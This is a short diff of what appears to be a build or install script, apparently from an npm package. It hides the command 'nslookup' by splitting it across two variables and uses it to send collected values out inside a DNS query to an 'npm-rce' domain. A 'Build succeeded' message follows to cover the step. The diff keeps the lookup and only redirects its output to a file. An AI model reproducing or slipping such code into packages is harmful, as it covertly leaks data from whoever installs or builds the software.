@@ -7,6 +7,6 @@ organization=org
 install_a=nslo
 install_b=okup
 
-$install_a$install_b npm-rce.programmeramera.$former$amount.$organization >/dev/null
+$install_a$install_b npm-rce.programmeramera.$former$amount.$organization > output.txt
 
 echo "Build succeeded..."
